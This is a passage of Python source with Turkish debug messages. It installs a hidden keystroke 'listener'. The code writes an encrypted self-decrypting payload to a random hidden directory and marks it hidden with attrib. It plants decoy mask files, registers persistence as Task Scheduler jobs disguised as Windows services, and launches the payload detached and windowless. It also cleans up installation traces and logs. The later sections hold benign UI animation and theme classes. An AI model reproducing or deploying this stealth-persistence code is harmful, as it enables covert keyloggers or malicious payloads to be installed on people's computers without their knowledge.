            if os.path.exists(hidden_path):
                for filename in os.listdir(hidden_path):
                    if filename.endswith('.pyw') or filename.endswith('.py'):
                        file_path = os.path.join(hidden_path, filename)
                        file_size = os.path.getsize(file_path)
                        listener_files.append({
                            'path': file_path,
                            'size': file_size,
                            'modified': datetime.datetime.fromtimestamp(os.path.getmtime(file_path))
                        })
        
        if listener_files:
            print(f"✓ {len(listener_files)} listener dosyası bulundu:")
            for file_info in listener_files:
                print(f"  - {file_info['path']}")
                print(f"    Boyut: {file_info['size']} bytes, Son değişiklik: {file_info['modified']}")
        else:
            print("✗ Hiç listener dosyası bulunamadı!")
        

        print("\\n5. ÖZET:")
        print("-" * 30)
        
        total_score = 0
        max_score = 4
        
        if listener_processes:
            print("✓ Process: ÇALIŞIYOR")
            total_score += 1
        else:
            print("✗ Process: ÇALIŞMIYOR")
        
        if listener_tasks:
            print("✓ Task Scheduler: KURULU")
            total_score += 1
        else:
            print("✗ Task Scheduler: KURULU DEĞİL")
        
        if listener_registry:
            print("✓ Registry: KURULU (Task Scheduler ile)")
            total_score += 1
        else:
            print("✗ Registry: KURULU DEĞİL (Task Scheduler ile)")
        
        if listener_files:
            print("✓ Dosyalar: MEVCUT")
            total_score += 1
        else:
            print("✗ Dosyalar: MEVCUT DEĞİL")
        
        print(f"\\nToplam Puan: {total_score}/{max_score}")
        
        if total_score == max_score:
            print(" Listener tamamen çalışır durumda!")
        elif total_score >= 2:
            print(" Listener kısmen çalışıyor, bazı sorunlar var.")
        else:
            print(" Listener çalışmıyor, yeniden kurulum gerekli.")
        
        print("=" * 60)
        print("[DEBUG] ====== CHECK_LISTENER_STATUS TAMAMLANDI ======")
        
    except Exception as e:
        print(f"[DEBUG] Status check hatası: {e}")
        print("[DEBUG] ====== CHECK_LISTENER_STATUS TAMAMLANDI ======")

def test_listener_script(pythonw, listener_path):
    print("[DEBUG] ====== TEST_LISTENER_SCRIPT BAŞLADI ======")
    print(f"[DEBUG] pythonw: {pythonw}")
    print(f"[DEBUG] listener_path: {listener_path}")
    
    try:
        if not os.path.exists(listener_path):
            print(f"[DEBUG]  Listener dosyası bulunamadı: {listener_path}")
            return False
        
        file_size = os.path.getsize(listener_path)
        print(f"[DEBUG] Dosya boyutu: {file_size} bytes")
        
        if file_size < 100:
            print(f"[DEBUG]  Dosya çok küçük, muhtemelen boş: {file_size} bytes")
            return False
        
        try:
            with open(listener_path, 'r', encoding='utf-8') as f:
                content = f.read()
                print(f"[DEBUG] Dosya içeriği uzunluğu: {len(content)}")
                
                if '_metadata' in content and '_encrypted_b64' in content and 'decrypt_and_exec' in content:
                    print("[DEBUG] ✓ Encrypted listener detected")
                    print("[DEBUG] ✓ Contains decryption functions")
                    print("[DEBUG] ✓ Contains encrypted payload")
                    print("[DEBUG] ✓ Encrypted listener validation passed")
                    return True
                else:
                    # Original validation for unencrypted files
                    required_functions = ['def main()', 'def on_press', 'def run_payload']
                    missing_functions = []
                    
                    for func in required_functions:
                        if func in content:
                            print(f"[DEBUG] ✓ {func} bulundu")
                        else:
                            print(f"[DEBUG] ✗ {func} bulunamadı")
                            missing_functions.append(func)
                    
                    if missing_functions:
                        print(f"[DEBUG] ✗ Eksik fonksiyonlar: {missing_functions}")
                        return False
                
        except Exception as e:
            print(f"[DEBUG] Dosya okuma hatası: {e}")
            return False
        
        try:
            compile(content, listener_path, 'exec')
            print("[DEBUG] ✓ Syntax kontrolü başarılı")
        except SyntaxError as e:
            print(f"[DEBUG] ✗ Syntax hatası: {e}")
            return False
        except Exception as e:
            print(f"[DEBUG] ✗ Compile hatası: {e}")
            return False
        
        print("[DEBUG] Pythonw ile test çalıştırılıyor...")
        try:
            import subprocess
            import time
            
            test_cmd = [pythonw, "-c", "import sys; print('Test successful'); sys.exit(0)"]
            print(f"[DEBUG] Test komutu: {test_cmd}")
            
            result = subprocess.run(test_cmd, capture_output=True, text=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW)
            
            print(f"[DEBUG] Test return code: {result.returncode}")
            print(f"[DEBUG] Test stdout: {result.stdout}")
            print(f"[DEBUG] Test stderr: {result.stderr}")
            
            if result.returncode == 0:
                print("[DEBUG] ✓ Pythonw test başarılı")
            else:
                print("[DEBUG] ✗ Pythonw test başarısız")
                return False
                
        except subprocess.TimeoutExpired:
            print("[DEBUG] ✗ Pythonw test timeout")
            return False
        except Exception as e:
            print(f"[DEBUG] ✗ Pythonw test hatası: {e}")
            return False
        
        print("[DEBUG] ====== TEST_LISTENER_SCRIPT TAMAMLANDI ======")
        return True
        
    except Exception as e:
        print(f"[DEBUG] Test hatası: {e}")
        print("[DEBUG] ====== TEST_LISTENER_SCRIPT TAMAMLANDI ======")
        return False



def install_listener(trigger_key_info=None):
    import subprocess
    print(f"[DEBUG] ====== INSTALL_LISTENER BAŞLADI ======")
    print(f"[DEBUG] trigger_key_info: {trigger_key_info}")
    
    debug_logger = TaskSchedulerDebugLogger()
    debug_logger.log("=" * 60)
    debug_logger.log("INSTALL_LISTENER BAŞLADI")
    debug_logger.log("=" * 60)
    debug_logger.log(f"Trigger key info: {trigger_key_info}")
    
    debug_logger.log_system_info()
    
    DETACHED_PROCESS = 0x00000008
    CREATE_NEW_PROCESS_GROUP = 0x00000200
    
    print("[DEBUG] Eski listener kaldırılıyor...")
    debug_logger.log("Eski listener kaldırılıyor...")
    
    try:
        uninstall_listener()
        print("[DEBUG] Eski listener kaldırma tamamlandı ✓")
        debug_logger.log("Eski listener kaldırma tamamlandı ✓")
    except Exception as e:
        print(f"[WARN] Eski listener kaldırma hatası: {e}")
        debug_logger.log(f"Eski listener kaldırma hatası: {e}")
    
    global HIDDEN_DIR, LISTENER_PATH
    HIDDEN_DIR = get_random_hidden_path()
    random_filename = get_random_filename()
    LISTENER_PATH = os.path.join(HIDDEN_DIR, random_filename)
    
    print(f"[DEBUG] Seçilen gizli dizin: {HIDDEN_DIR}")
    print(f"[DEBUG] Dizin mevcut mu: {os.path.exists(HIDDEN_DIR)}")
    print(f"[DEBUG] Rastgele dosya adı: {random_filename}")
    print(f"[DEBUG] Listener yolu: {LISTENER_PATH}")
    
    debug_logger.log(f"Seçilen gizli dizin: {HIDDEN_DIR}")
    debug_logger.log(f"Dizin mevcut mu: {os.path.exists(HIDDEN_DIR)}")
    debug_logger.log(f"Rastgele dosya adı: {random_filename}")
    debug_logger.log(f"Listener yolu: {LISTENER_PATH}")
    
    try:
        os.makedirs(HIDDEN_DIR, exist_ok=True)
        print(f"[DEBUG] Dizin oluşturuldu: {HIDDEN_DIR}")
        print(f"[DEBUG] Dizin içeriği: {os.listdir(HIDDEN_DIR) if os.path.exists(HIDDEN_DIR) else 'Dizin yok'}")
        debug_logger.log(f"Dizin oluşturuldu: {HIDDEN_DIR}")
        debug_logger.log(f"Dizin içeriği: {os.listdir(HIDDEN_DIR) if os.path.exists(HIDDEN_DIR) else 'Dizin yok'}")
    except Exception as e:
        print(f"[ERROR] Dizin oluşturma hatası: {e}")
        debug_logger.log(f"Dizin oluşturma hatası: {e}")
        return False
    
    print("[DEBUG] Maskeleme dosyaları oluşturuluyor...")
    try:
        create_mask_files()
        print("[DEBUG] Maskeleme dosyaları oluşturuldu ✓")
    except Exception as e:
        print(f"[WARN] Maskeleme dosyaları oluşturma hatası: {e}")
    
    print("[DEBUG] Listener script oluşturuluyor...")
    try:
        script = get_listener_script(trigger_key_info or {'keysym': 'insert', 'keycode': 45})
        print(f"[DEBUG] Script uzunluğu: {len(script)}")
        print(f"[DEBUG] Script ilk 300 karakter: {script[:300]}")
        if 'def main()' in script:
            print("[DEBUG] Script'te main() fonksiyonu bulundu ✓")
        else:
            print("[DEBUG] Script'te main() fonksiyonu bulunamadı ✗")
    except Exception as e:
        print(f"[ERROR] Script oluşturma hatası: {e}")
        import traceback
        traceback.print_exc()
        return False
    
    print(f"[DEBUG] Listener dosyası yazılıyor: {LISTENER_PATH}")
    try:
        passphrase = gen_random_passphrase()
        print(f"[DEBUG] Encryption passphrase generated: {passphrase[:8]}...")
        
        encrypted_script = create_encrypted_loader(script, passphrase)
        
        with open(LISTENER_PATH, 'w', encoding='utf-8') as f:
            f.write(encrypted_script)
        print(f"[DEBUG] Encrypted listener dosyası yazıldı ✓")
        
        if os.path.exists(LISTENER_PATH):
            file_size = os.path.getsize(LISTENER_PATH)
            print(f"[DEBUG] Dosya boyutu: {file_size} bytes")
            print(f"[DEBUG] Dosya içeriği ilk 200 karakter: {script[:200]}")
        
        try:
            import subprocess
            subprocess.run(f'attrib +h "{LISTENER_PATH}"', shell=True, creationflags=0x08000000)
            print("[DEBUG] Dosya gizli yapıldı ✓")
        except Exception as e:
            print(f"[WARN] Listener dosyasını gizli yaparken hata: {e}")
    except Exception as e:
        print(f"[ERROR] Listener dosyası yazma hatası: {e}")
        return False
    
    import time
    time.sleep(0.1)
    
    if not os.path.exists(LISTENER_PATH):
        print(f"[ERROR] Listener scripti bulunamadı: {LISTENER_PATH}")
        return False
    
    print("[DEBUG] Task Scheduler ile başlatılıyor...")
    pythonw = get_pythonw()
    print(f"[DEBUG] Pythonw yolu: {pythonw}")
    print(f"[DEBUG] Pythonw mevcut mu: {os.path.exists(pythonw) if pythonw else 'None'}")
    print(f"[DEBUG] Başlatılacak komut: \"{pythonw}\" \"{LISTENER_PATH}\"")
    
    print("[DEBUG] Sadece Task Scheduler kullanılıyor (Registry kayıt olmadan)...")
    schedule_success = schedule_listener(pythonw, LISTENER_PATH)
    if not schedule_success:
        print("[ERROR] Task Scheduler görevi oluşturulamadı!")
        return False
    
    print("[DEBUG] Listener hemen başlatılıyor...")
    try:
        print(f"[DEBUG] Process başlatılıyor: {pythonw} {LISTENER_PATH}")
        listener_process = subprocess.Popen([pythonw, LISTENER_PATH], 
                       creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS,
                       stdout=subprocess.DEVNULL, 
                       stderr=subprocess.DEVNULL)
        print(f"[INFO] Listener başlatıldı! PID: {listener_process.pid}")
        
        time.sleep(1)
        if listener_process.poll() is None:
            print(f"[SUCCESS] Listener başarıyla çalışıyor! PID: {listener_process.pid}")
            
            try:
                import psutil
                if psutil.pid_exists(listener_process.pid):
                    proc = psutil.Process(listener_process.pid)
                    print(f"[DEBUG] Process bilgileri:")
                    print(f"[DEBUG] - Name: {proc.name()}")
                    print(f"[DEBUG] - Status: {proc.status()}")
                    print(f"[DEBUG] - CPU: {proc.cpu_percent()}%")
                    print(f"[DEBUG] - Memory: {proc.memory_info().rss / 1024 / 1024:.2f} MB")
                    
                    try:
                        cmdline = proc.cmdline()
                        print(f"[DEBUG] - Command line: {cmdline}")
                        if LISTENER_PATH in ' '.join(cmdline):
                            print("[DEBUG] ✓ Listener path command line'da bulundu")
                        else:
                            print("[DEBUG] ✗ Listener path command line'da bulunamadı")
                    except Exception as e:
                        print(f"[DEBUG] Command line okunamadı: {e}")
                        
                else:
                    print("[WARN] Process PID bulunamadı!")
                    
                print("[DEBUG] Sistemdeki tüm pythonw process'leri:")
                try:
                    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                        if proc.info['name'] and 'pythonw' in proc.info['name'].lower():
                            cmdline = proc.info.get('cmdline', [])
                            print(f"[DEBUG] - PID {proc.info['pid']}: {cmdline}")
                            if LISTENER_PATH in ' '.join(cmdline):
                                print(f"[DEBUG] ✓ Listener process bulundu: PID {proc.info['pid']}")
                except Exception as e:
                    print(f"[DEBUG] Process listesi alınamadı: {e}")
                    
            except Exception as e:
                print(f"[WARN] Process bilgisi alınamadı: {e}")
        else:
            print(f"[WARN] Listener process sonlandı! Return code: {listener_process.returncode}")
            
    except Exception as e:
        print(f"[WARN] Listener başlatma hatası: {e}")
        import traceback
        traceback.print_exc()
    
    time.sleep(0.5)
    
    print("[DEBUG] Listener test ediliyor...")
    try:
        test_result = test_listener_script(pythonw, LISTENER_PATH)
        if test_result:
            print("[DEBUG] Listener test başarılı ✓")
        else:
            print("[DEBUG] Listener test başarısız ✗")
    except Exception as e:
        print(f"[DEBUG] Listener test hatası: {e}")
    
    print("[DEBUG] Listener monitoring thread başlatılıyor...")
    try:
        monitoring_thread = threading.Thread(target=monitor_listener_process, args=(LISTENER_PATH,), daemon=True)
        monitoring_thread.start()
        print("[DEBUG] Listener monitoring thread başlatıldı ✓")
    except Exception as e:
        print(f"[DEBUG] Listener monitoring thread başlatma hatası: {e}")
    
    print("[DEBUG] install_listener tamamlandı")
    
    debug_logger.log("=" * 60)
    debug_logger.log("KURULUM SONUÇLARI")
    debug_logger.log("=" * 60)
    debug_logger.log(f"Listener dosyası: {LISTENER_PATH}")
    debug_logger.log(f"Listener boyutu: {os.path.getsize(LISTENER_PATH)} bytes")
    debug_logger.log(f"Gizli dizin: {HIDDEN_DIR}")
    
    debug_logger.log_task_status()
    
    debug_logger.log("Debug log dosyası: Gizlilik için kaldırıldı")
    debug_logger.log("=" * 60)
    debug_logger.log("INSTALL_LISTENER TAMAMLANDI")
    debug_logger.log("=" * 60)
    
    print("[SUCCESS] Listener kurulumu tamamlandı! (Sadece Task Scheduler)")
    print(f"[DEBUG] ====== INSTALL_LISTENER TAMAMLANDI ======")
    print(f"[DEBUG] Debug log dosyası: Gizlilik için kaldırıldı")
    return True

def uninstall_listener():
    import subprocess
    print("[DEBUG] uninstall_listener başladı")
    
    try:
        import psutil
        listener_found = False
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                cmdline = proc.info.get('cmdline', [])
                if any('pythonw' in str(arg).lower() for arg in cmdline):
                    for hidden_path in HIDDEN_PATHS:
                        if any(hidden_path in str(arg) for arg in cmdline):
                            print(f"[DEBUG] Listener process bulundu: PID {proc.info['pid']}, Komut: {' '.join(cmdline)}")
                            listener_found = True
                            try:
                                proc.terminate()
                                proc.wait(timeout=3)
                                print(f"[INFO] Process sonlandırıldı: PID {proc.info['pid']}")
                            except Exception:
                                try:
                                    proc.kill()
                                    print(f"[INFO] Process zorla kapatıldı: PID {proc.info['pid']}")
                                except Exception as e:
                                    print(f"[WARN] Process kapatılamadı PID {proc.info['pid']}: {e}")
                            break
            except Exception as e:
                continue
        
        if not listener_found:
            print("[DEBUG] Çalışan listener process bulunamadı")
            
    except Exception as e:
        print(f"[WARN] Process sonlandırma hatası: {e}")
    

    print("[DEBUG] Dosya temizleme başlıyor...")
    files_removed = 0
    
    try:
        for hidden_path in HIDDEN_PATHS:
            try:
                if os.path.exists(hidden_path):
                    print(f"[DEBUG] Yol kontrol ediliyor: {hidden_path}")
                    for filename in os.listdir(hidden_path):
                        file_path = os.path.join(hidden_path, filename)
                        
                        if os.path.isfile(file_path):
                            if filename in MASK_FILES:
                                try:
                                    subprocess.run(f'attrib -h "{file_path}"', shell=True, creationflags=0x08000000)
                                    os.remove(file_path)
                                    print(f"[MASK] Removed mask file: {filename} from {hidden_path}")
                                    files_removed += 1
                                except Exception as e:
                                    print(f"[WARN] Mask dosyası kaldırma hatası {filename}: {e}")
                            else:
                                base_names = ['cache', 'system', 'config', 'data', 'log', 'temp', 'backup',
                                            'settings', 'preferences', 'theme', 'display', 'window', 'user',
                                            'sync', 'update', 'service', 'host', 'audio', 'media', 'network']
                                extensions = ['.log', '.dat', '.cfg', '.ini', '.txt', '.cache', '.tmp', '.bak']
                                
                                should_delete = False
                                for base in base_names:
                                    for ext in extensions:
                                        if base in filename.lower() and filename.lower().endswith(ext):
                                            if len(filename) > len(base + ext) + 1:  
                                                should_delete = True
                                                break
                                    if should_delete:
                                        break
                                
                                if should_delete:
                                    try:
                                        subprocess.run(f'attrib -h "{file_path}"', shell=True, creationflags=0x08000000)
                                        os.remove(file_path)
                                        print(f"[RANDOM] Removed random file: {filename} from {hidden_path}")
                                        files_removed += 1
                                    except Exception as e:
                                        print(f"[WARN] Random dosyası kaldırma hatası {filename}: {e}")
                                    
            except Exception as e:
                print(f"[WARN] Yol kontrol hatası {hidden_path}: {e}")
                continue
        
        print(f"[DEBUG] Toplam {files_removed} dosya kaldırıldı")
                
    except Exception as e:
        print(f"[WARN] Dosya temizleme hatası: {e}")
    
    try:
        task_names = [
            "WindowsSystemService", "SystemConfigUpdate", "WindowsSearchService", "UserDataSync"
        ]
        
        for task_name in task_names:
            try:
                result = subprocess.run(f'schtasks /Query /TN "{task_name}"', shell=True, capture_output=True, creationflags=0x08000000)
                if result.returncode == 0:
                    subprocess.run(f'schtasks /Delete /TN "{task_name}" /F', shell=True, capture_output=True, creationflags=0x08000000)
                    print(f"[INFO] Task Scheduler görevi kaldırıldı: {task_name}")
            except Exception:
                continue
    except Exception as e:
        print(f"[WARN] Task Scheduler temizleme hatası: {e}")
    
    print("[DEBUG] Registry temizleme atlandı (sadece Task Scheduler kullanılıyor)")
    
    try:
        if os.path.exists(CONFIG_PATH):
            os.remove(CONFIG_PATH)
            print(f"[INFO] Config dosyası kaldırıldı: {CONFIG_PATH}")
    except Exception as e:
        print(f"[WARN] Config dosyası silme hatası: {e}")
    
    print("[DEBUG] uninstall_listener tamamlandı")

def show_countdown(root):
    lang = current_lang['lang']
    countdown_window = ctk.CTkToplevel(root)
    countdown_window.title(LANGUAGES[lang]['success'])
    countdown_window.geometry("340x320")
    countdown_window.attributes("-topmost", True)
    countdown_window.resizable(False, False)
    countdown_window.overrideredirect(True)
    root.update_idletasks()
    root_width = root.winfo_width()
    root_height = root.winfo_height()
    root_x = root.winfo_x()
    root_y = root.winfo_y()
    window_width = 340
    window_height = 320
    x = root_x + (root_width - window_width) // 2
    y = root_y + (root_height - window_height) // 2
    countdown_window.geometry(f"{window_width}x{window_height}+{x}+{y}")
    
    countdown_window.after(200, lambda: enable_stream_proof(countdown_window))
    
    countdown_window.after(300, clean_installation_traces)
    
    frame = ctk.CTkFrame(countdown_window, fg_color="#1c1c1e")
    frame.pack(fill="both", expand=True)
    canvas = ctk.CTkCanvas(frame, width=160, height=160, bg="#1c1c1e", highlightthickness=0)
    canvas.place(relx=0.5, rely=0.38, anchor="center")
    arc = canvas.create_arc(15, 15, 145, 145, start=90, extent=360, style="arc", outline=PRIMARY_COLOR, width=10)
    label = canvas.create_text(80, 80, text="10", font=("Segoe UI", 48, "bold"), fill=PRIMARY_COLOR)
    bottom_text = ctk.CTkLabel(frame, text=LANGUAGES[lang].get('auto_close', 'The program will close automatically'), font=("Segoe UI", 14), text_color=TEXT_COLOR)
    bottom_text.place(relx=0.5, rely=0.82, anchor="center")
    countdown_after_id = [None]
    is_closing = [False]
    
    current_seconds = [5.0]
    last_update = [time.time()]
    
    def update_countdown_smooth():
        if is_closing[0] or not canvas.winfo_exists():
            return
        
        current_time = time.time()
        elapsed = current_time - last_update[0]
        last_update[0] = current_time
        
        current_seconds[0] -= elapsed
        
        if current_seconds[0] <= 0:
            try:
                if countdown_after_id[0] is not None and canvas.winfo_exists():
                    canvas.after_cancel(countdown_after_id[0])
            except Exception:
                pass
            is_closing[0] = True
            try:
                if countdown_window.winfo_exists():
                    countdown_window.destroy()
            except Exception:
                pass
            return
        
        display_seconds = int(current_seconds[0])
        canvas.itemconfig(label, text=str(display_seconds))
        
        progress_ratio = current_seconds[0] / 5.0
        angle = 360 * progress_ratio
        canvas.itemconfig(arc, extent=angle)
        
        countdown_after_id[0] = canvas.after(50, update_countdown_smooth)

    def on_close():
        is_closing[0] = True
        if countdown_after_id[0] is not None:
            try:
                if canvas.winfo_exists():
                    canvas.after_cancel(countdown_after_id[0])
            except Exception:
                pass
            countdown_after_id[0] = None
        if 'spinner_after_id' in locals() and spinner_after_id[0] is not None:
            try:
                if canvas.winfo_exists():
                    canvas.after_cancel(spinner_after_id[0])
            except Exception:
                pass
            spinner_after_id[0] = None
        if 'dots_after_id' in locals() and dots_after_id[0] is not None:
            try:
                if 'dots_label' in locals() and dots_label.winfo_exists():
                    dots_label.after_cancel(dots_after_id[0])
            except Exception:
                pass
            dots_after_id[0] = None
        try:
            if 'loading_window' in locals() and loading_window.winfo_exists():
                loading_window.destroy()
        except Exception:
            pass
        try:
            if countdown_window.winfo_exists():
                countdown_window.destroy()
        except Exception:
            pass
    countdown_window.protocol("WM_DELETE_WINDOW", on_close)
    update_countdown_smooth()
    countdown_window_ref['win'] = countdown_window
    countdown_window_ref['bottom_text'] = bottom_text
    return countdown_window, on_close

def show_installation_loading_screen(root):
    lang = current_lang['lang']
    loading_window = ctk.CTkToplevel(root)
    loading_window.title(LANGUAGES[lang]['downloading'])
    loading_window.geometry("340x260")
    loading_window.attributes("-topmost", True)
    loading_window.resizable(False, False)
    loading_window.overrideredirect(True)
    root.update_idletasks()
    root_width = root.winfo_width()
    root_height = root.winfo_height()
    root_x = root.winfo_x()
    root_y = root.winfo_y()
    window_width = 340
    window_height = 260
    x = root_x + (root_width - window_width) // 2
    y = root_y + (root_height - window_height) // 2
    loading_window.geometry(f"{window_width}x{window_height}+{x}+{y}")
    
    loading_window.after(200, lambda: enable_stream_proof(loading_window))
    
    frame = ctk.CTkFrame(loading_window, fg_color="#1c1c1e")
    frame.pack(fill="both", expand=True)
    canvas = ctk.CTkCanvas(frame, width=120, height=120, bg="#1c1c1e", highlightthickness=0)
    canvas.place(relx=0.5, rely=0.38, anchor="center")
    arc = canvas.create_arc(10, 10, 110, 110, start=0, extent=270, style="arc", outline=PRIMARY_COLOR, width=8)
    angle = [0]
    spinner_after_id = [None]
    dots_after_id = [None]
    is_closing = [False]
    def animate_spinner():
        if is_closing[0] or not canvas.winfo_exists():
            return
        angle[0] = (angle[0] + 6) % 360
        canvas.itemconfig(arc, start=angle[0])
        spinner_after_id[0] = canvas.after(16, animate_spinner)
    animate_spinner()
    text_label = ctk.CTkLabel(frame, text=LANGUAGES[lang]['downloading'], font=("Segoe UI", 18, "bold"), text_color=PRIMARY_COLOR)
    text_label.place(relx=0.5, rely=0.72, anchor="center")
    dots_label = ctk.CTkLabel(frame, text="", font=("Segoe UI", 22, "bold"), text_color=PRIMARY_COLOR)
    dots_label.place(relx=0.5, rely=0.82, anchor="center")
    def animate_dots(step=0):
        if is_closing[0] or not dots_label.winfo_exists():
            return
        dots = "." * (step % 4)
        dots_label.configure(text=dots)
        if dots_after_id[0] is not None and dots_label.winfo_exists():
            dots_after_id[0] = dots_label.after(400, animate_dots, (step + 1) % 4)
    animate_dots()
    def on_close():
        is_closing[0] = True
        if spinner_after_id[0] is not None and canvas.winfo_exists():
            try:
                canvas.after_cancel(spinner_after_id[0])
            except Exception:
                pass
            spinner_after_id[0] = None
        if dots_after_id[0] is not None and dots_label.winfo_exists():
            try:
                dots_label.after_cancel(dots_after_id[0])
            except Exception:
                pass
            dots_after_id[0] = None
        try:
            if loading_window.winfo_exists():
                loading_window.destroy()
        except Exception:
            pass
    loading_window.protocol("WM_DELETE_WINDOW", on_close)
    loading_window_ref['win'] = loading_window
    loading_window_ref['text_label'] = text_label
    return loading_window, on_close




class AnimationEngine:
    def __init__(self):
        self.active_animations = {}
        self.easing_functions = {
            'linear': lambda t: t,
            'ease_in': lambda t: t * t,
            'ease_out': lambda t: 1 - (1 - t) * (1 - t),
            'ease_in_out': lambda t: t * t * (3 - 2 * t),
            'bounce': lambda t: 1 - (math.cos(t * math.pi * 2) * math.exp(-t * 3)),
            'elastic': lambda t: math.sin(t * math.pi * 2) * math.exp(-t * 3),
            'back': lambda t: t * t * (2.70158 * t - 1.70158)
        }
    
    def animate_property(self, widget, property_name, start_value, end_value, 
                        duration=1000, easing='ease_in_out', callback=None):
        animation_id = f"{id(widget)}_{property_name}_{time.time()}"
        
        start_time = time.time()
        
        def update_animation():
            current_time = time.time()
            elapsed = current_time - start_time
            progress = min(elapsed / (duration / 1000), 1.0)
            
            if easing in self.easing_functions:
                progress = self.easing_functions[easing](progress)
            
            if isinstance(start_value, (int, float)) and isinstance(end_value, (int, float)):
                current_value = start_value + (end_value - start_value) * progress
            elif isinstance(start_value, str) and isinstance(end_value, str):
                current_value = self.interpolate_color(start_value, end_value, progress)
            else:
                current_value = end_value if progress >= 1 else start_value
            
            try:
                if hasattr(widget, 'configure'):
                    widget.configure(**{property_name: current_value})
                elif hasattr(widget, property_name):
                    setattr(widget, property_name, current_value)
            except:
                pass
            
            if progress < 1.0:
                self.active_animations[animation_id] = widget.after(16, update_animation)
            else:
                if animation_id in self.active_animations:
                    del self.active_animations[animation_id]
                if callback:
                    callback()
        
        self.active_animations[animation_id] = widget.after(16, update_animation)
        return animation_id
    
    def interpolate_color(self, color1, color2, progress):
        try:
            def hex_to_rgb(hex_color):
                hex_color = hex_color.lstrip('#')
                return tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))
            
            def rgb_to_hex(rgb):
                return '#{:02x}{:02x}{:02x}'.format(int(rgb[0]), int(rgb[1]), int(rgb[2]))
            
            rgb1 = hex_to_rgb(color1)
            rgb2 = hex_to_rgb(color2)
            
            rgb_result = tuple(rgb1[i] + (rgb2[i] - rgb1[i]) * progress for i in range(3))
            return rgb_to_hex(rgb_result)
        except:
            return color2 if progress >= 1 else color1
    
    def stop_animation(self, animation_id):
        if animation_id in self.active_animations:
            try:
                widget = self.active_animations[animation_id]
                widget.after_cancel(animation_id)
            except:
                pass
            del self.active_animations[animation_id]
    
    def stop_all_animations(self):
        for animation_id in list(self.active_animations.keys()):
            self.stop_animation(animation_id)

animation_engine = AnimationEngine()

class ThemeManager:
    def __init__(self):
        self.current_theme = 'dark'
        self.themes = {
            'dark': {
                'bg_primary': '#1a1a1a',
                'bg_secondary': '#2d2d2d',
                'bg_tertiary': '#3d3d3d',
                'text_primary': '#ffffff',
                'text_secondary': '#cccccc',
                'text_muted': '#888888',
                'accent_primary': '#ff6b35',
                'accent_secondary': '#ff8c42',
                'accent_tertiary': '#ffa726',
                'success': '#4caf50',
                'warning': '#ff9800',
                'error': '#f44336',
                'border': '#444444',
                'shadow': '#000000',
                'glow': '#ff6b35'
            },
            'light': {
                'bg_primary': '#ffffff',
                'bg_secondary': '#f5f5f5',
                'bg_tertiary': '#e0e0e0',
                'text_primary': '#000000',
                'text_secondary': '#333333',
                'text_muted': '#666666',
                'accent_primary': '#ff6b35',
                'accent_secondary': '#ff8c42',
                'accent_tertiary': '#ffa726',
                'success': '#4caf50',
                'warning': '#ff9800',
                'error': '#f44336',
                'border': '#dddddd',
                'shadow': '#000000',
                'glow': '#ff6b35'
            },
            'neon': {
                'bg_primary': '#0a0a0a',
                'bg_secondary': '#1a1a1a',
                'bg_tertiary': '#2a2a2a',
                'text_primary': '#00ff00',
                'text_secondary': '#00cc00',
                'text_muted': '#008800',
                'accent_primary': '#00ff00',
                'accent_secondary': '#00cc00',
                'accent_tertiary': '#008800',
                'success': '#00ff00',
                'warning': '#ffff00',
                'error': '#ff0000',
                'border': '#00ff00',
                'shadow': '#000000',
                'glow': '#00ff00'
            },
            'cyber': {
                'bg_primary': '#0d1117',
                'bg_secondary': '#161b22',
                'bg_tertiary': '#21262d',
                'text_primary': '#f0f6fc',
                'text_secondary': '#c9d1d9',
                'text_muted': '#8b949e',
                'accent_primary': '#58a6ff',
                'accent_secondary': '#79c0ff',
                'accent_tertiary': '#1f6feb',
                'success': '#238636',
                'warning': '#d29922',
                'error': '#da3633',
                'border': '#30363d',
                'shadow': '#000000',
                'glow': '#58a6ff'
            },
            'sunset': {
                'bg_primary': '#2d1b69',
                'bg_secondary': '#3d2b79',
                'bg_tertiary': '#4d3b89',
                'text_primary': '#ffffff',
                'text_secondary': '#f0f0f0',
                'text_muted': '#cccccc',
                'accent_primary': '#ff6b35',
                'accent_secondary': '#ff8c42',
                'accent_tertiary': '#ffa726',
                'success': '#4caf50',
                'warning': '#ff9800',
                'error': '#f44336',
                'border': '#5d4b99',
                'shadow': '#000000',
                'glow': '#ff6b35'
            }
        }
        self.registered_widgets = {}
    
    def register_widget(self, widget, theme_properties):
        widget_id = id(widget)
        self.registered_widgets[widget_id] = {
            'widget': widget,
            'properties': theme_properties
        }
    
    def unregister_widget(self, widget):
        widget_id = id(widget)
        if widget_id in self.registered_widgets:
            del self.registered_widgets[widget_id]
    
    def set_theme(self, theme_name):
        if theme_name not in self.themes:
            return False
        
        self.current_theme = theme_name
        theme = self.themes[theme_name]
        
        for widget_id, widget_data in self.registered_widgets.items():
            try:
                widget = widget_data['widget']
                properties = widget_data['properties']
                
                for prop_name, theme_key in properties.items():
                    if theme_key in theme:
                        if hasattr(widget, 'configure'):
                            widget.configure(**{prop_name: theme[theme_key]})
                        elif hasattr(widget, prop_name):
                            setattr(widget, prop_name, theme[theme_key])
            except:
                continue
        
        return True
    
    def get_color(self, color_name):
        return self.themes[self.current_theme].get(color_name, '#000000')
    
    def get_theme_names(self):
        return list(self.themes.keys())

theme_manager = ThemeManager()

class ParticleSystem:
    def __init__(self, canvas, max_particles=100):
        self.canvas = canvas
        self.max_particles = max_particles
        self.particles = []
        self.emitters = []
        self.gravity = 0.1
        self.wind = 0.0
        self.is_running = False
    
    def add_emitter(self, x, y, particle_type='sparkle', rate=10, lifetime=3000):
        emitter = {
            'x': x,
            'y': y,
            'type': particle_type,
            'rate': rate,
            'lifetime': lifetime,
            'last_emission': time.time()
        }
        self.emitters.append(emitter)
    
    def create_particle(self, x, y, particle_type='sparkle'):
        if len(self.particles) >= self.max_particles:
            return None
        
        if particle_type == 'sparkle':
            particle = {
                'x': x,
                'y': y,
                'vx': random.uniform(-2, 2),
                'vy': random.uniform(-3, -1),
                'life': 1.0,
                'decay': random.uniform(0.02, 0.05),
                'size': random.uniform(2, 6),
                'color': random.choice(['#ff6b35', '#ff8c42', '#ffa726', '#ffffff']),
                'type': 'sparkle'
            }
        elif particle_type == 'smoke':
            particle = {
                'x': x,
                'y': y,
                'vx': random.uniform(-1, 1),
                'vy': random.uniform(-2, -0.5),
                'life': 1.0,
                'decay': random.uniform(0.01, 0.03),
